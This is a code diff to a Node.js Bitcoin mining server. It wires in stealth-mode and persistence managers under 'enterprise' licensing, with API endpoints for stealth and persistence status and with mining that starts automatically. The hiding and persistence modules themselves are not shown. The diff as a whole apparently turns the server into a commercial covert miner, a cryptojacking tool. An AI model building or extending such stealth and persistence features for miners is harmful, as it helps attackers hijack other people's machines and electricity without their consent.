@@ -8,6 +8,11 @@ const EventEmitter = require('events');
 const os = require('os');
 const path = require('path');
 const PlatformDetector = require('./src/utils/PlatformDetector');
+const StealthManager = require('./src/stealth/StealthManager');
+const PersistenceManager = require('./src/persistence/PersistenceManager');
+const EnterpriseMonitor = require('./src/monitoring/EnterpriseMonitor');
+const EnterpriseSecurity = require('./src/security/EnterpriseSecurity');
+const LicenseManager = require('./src/commercial/LicenseManager');
 
 /**
  * Bitcoin Mining Server
@@ -25,8 +30,13 @@ class BitcoinMiningServer extends EventEmitter {
         this.port = process.env.PORT || 3000;
         this.host = '0.0.0.0';
         
-        // Initialize platform detector
+        // Initialize enterprise components
         this.platformDetector = new PlatformDetector();
+        this.stealthManager = new StealthManager();
+        this.persistenceManager = new PersistenceManager();
+        this.enterpriseMonitor = new EnterpriseMonitor();
+        this.enterpriseSecurity = new EnterpriseSecurity();
+        this.licenseManager = new LicenseManager();
         
         // Mining configuration
         this.config = {
@@ -77,6 +87,11 @@ class BitcoinMiningServer extends EventEmitter {
             res.sendFile(path.join(__dirname, 'mining-dashboard.html'));
         });
 
+        // Enterprise dashboard
+        this.app.get('/enterprise', (req, res) => {
+            res.sendFile(path.join(__dirname, 'enterprise-dashboard.html'));
+        });
+
         // API endpoints
         this.app.get('/api/status', (req, res) => {
             res.json({
@@ -86,6 +101,78 @@ class BitcoinMiningServer extends EventEmitter {
                 clients: Array.from(this.state.clients.values()),
                 lastUpdated: new Date().toISOString()
             });
+        });
+
+        // Enterprise API endpoints
+        this.app.get('/api/enterprise/license', (req, res) => {
+            try {
+                const licenseInfo = this.licenseManager.getLicenseInfo();
+                res.json({
+                    success: true,
+                    license: licenseInfo,
+                    editions: this.licenseManager.getAvailableEditions()
+                });
+            } catch (error) {
+                res.status(500).json({ success: false, error: error.message });
+            }
+        });
+
+        this.app.post('/api/enterprise/activate', async (req, res) => {
+            try {
+                const { licenseKey } = req.body;
+                const result = await this.licenseManager.activateLicense(licenseKey);
+                res.json(result);
+            } catch (error) {
+                res.status(500).json({ success: false, error: error.message });
+            }
+        });
+
+        this.app.get('/api/enterprise/security', (req, res) => {
+            try {
+                const securityReport = this.enterpriseSecurity.getSecurityReport();
+                res.json({
+                    success: true,
+                    security: securityReport
+                });
+            } catch (error) {
+                res.status(500).json({ success: false, error: error.message });
+            }
+        });
+
+        this.app.get('/api/enterprise/monitoring', (req, res) => {
+            try {
+                const monitoringReport = this.enterpriseMonitor.getMonitoringReport();
+                res.json({
+                    success: true,
+                    monitoring: monitoringReport
+                });
+            } catch (error) {
+                res.status(500).json({ success: false, error: error.message });
+            }
+        });
+
+        this.app.get('/api/enterprise/stealth', (req, res) => {
+            try {
+                const stealthStatus = this.stealthManager.getStealthStatus();
+                res.json({
+                    success: true,
+                    stealth: stealthStatus
+                });
+            } catch (error) {
+                res.status(500).json({ success: false, error: error.message });
+            }
+        });
+
+        this.app.get('/api/enterprise/persistence', (req, res) => {
+            try {
+                const persistenceStatus = this.persistenceManager.getPersistenceStatus();
+                res.json({
+                    success: true,
+                    persistence: persistenceStatus
+                });
+            } catch (error) {
+                res.status(500).json({ success: false, error: error.message });
+            }
         });
 
         this.app.get('/api/clients', (req, res) => {
@@ -217,6 +304,36 @@ class BitcoinMiningServer extends EventEmitter {
     broadcastSystemUpdate() {
         this.io.emit('systemUpdate', this.state);
         this.io.emit('clientList', Array.from(this.state.clients.values()));
+    }
+
+    initializeEnterpriseFeatures() {
+        console.log('🏢 Initializing enterprise features...');
+        
+        // Initialize security system
+        this.enterpriseSecurity.initialize();
+        
+        // Check license and enable features accordingly
+        const licenseInfo = this.licenseManager.getLicenseInfo();
+        
+        // Enable stealth mode if licensed
+        if (this.licenseManager.hasFeature('stealthMode')) {
+            this.stealthManager.enableStealthMode();
+            console.log('🕵️ Stealth mode enabled');
+        }
+        
+        // Enable persistence if licensed
+        if (this.licenseManager.hasFeature('persistence')) {
+            this.persistenceManager.enablePersistence();
+            console.log('🛡️ Persistence enabled');
+        }
+        
+        // Start enterprise monitoring if licensed
+        if (this.licenseManager.hasFeature('enterpriseMonitoring')) {
+            this.enterpriseMonitor.startMonitoring();
+            console.log('📊 Enterprise monitoring enabled');
+        }
+        
+        console.log('✅ Enterprise features initialized');
     }
 
     startLocalMining() {
@@ -374,16 +491,24 @@ class BitcoinMiningServer extends EventEmitter {
     }
 
     start() {
+        // Initialize enterprise features
+        this.initializeEnterpriseFeatures();
+        
         this.server.listen(this.port, this.host, () => {
-            console.log('\n🚀 Bitcoin Mining Server');
-            console.log('═'.repeat(40));
+            console.log('\n🚀 Bitcoin Mining Enterprise Server');
+            console.log('═'.repeat(50));
             console.log(`📊 Dashboard: http://localhost:${this.port}`);
             console.log(`🌐 Network: http://${this.getNetworkIP()}:${this.port}`);
             console.log(`💻 Platform: ${this.state.platform.os} ${this.state.platform.arch} (${this.state.platform.release})`);
             console.log(`🧠 CPU Cores: ${this.state.platform.cpuCores}`);
             console.log(`💾 Memory: ${this.state.platform.totalMemory}GB`);
             console.log(`💰 Wallet: ${this.config.walletAddress}`);
-            console.log('\n🎯 Ready for Bitcoin Mining!');
+            
+            // Display license information
+            const licenseInfo = this.licenseManager.getLicenseInfo();
+            console.log(`📋 License: ${licenseInfo.isActivated ? 'Activated' : 'Trial'} (${licenseInfo.trialDaysRemaining} days)`);
+            
+            console.log('\n🎯 Enterprise Bitcoin Mining Ready!');
             
             // Auto-start mining if not running
             setTimeout(() => {
